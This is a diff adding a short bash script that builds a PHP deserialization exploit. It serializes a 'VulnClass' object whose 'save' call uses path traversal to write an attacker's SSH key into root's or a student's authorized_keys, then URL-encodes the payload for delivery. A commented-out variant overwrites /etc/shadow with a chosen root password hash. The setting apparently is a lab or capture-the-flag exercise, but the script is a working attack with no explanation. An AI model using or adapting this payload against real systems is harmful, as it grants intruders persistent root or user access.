@@ -1,0 +1,23 @@
+#!/bin/bash
+ 
+PATH='../../../root/.ssh/authorized_keys'
+PATH='../../../home/student/.ssh/authorized_keys'
+DATA='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE8OPuZg6wX4+kpLnT+ljUAjGUqzZn4TLxFdOhVaJsvc mno'
+ 
+# PATH='../../../etc/shadow'
+# DATA='root:$6$bkDvCa1C$AiV6a5y/.VlCNxnZDTsfPTPD05hqWL59cBp4ryKNYxOtejpUfz4VWDR2qdNq..eAHt0fi5iT79hQAEItKSTFY0:19652:0:99999:7:::'
+ 
+PATH="s:${#PATH}:\"${PATH}\""
+DATA="s:${#DATA}:\"${DATA}\""
+ 
+PREFIX='O:9:"VulnClass":2:'
+FUNC='s:4:"func";s:4:"save"'
+ 
+IDK="${PREFIX}\
+{${FUNC};s:4:\"args\";a:2:{i:0;${PATH};i:1;${DATA};};}"
+ 
+echo "$IDK"
+echo
+echo -n "$IDK" | /usr/bin/jq -srR @uri
+exit 0
+ 
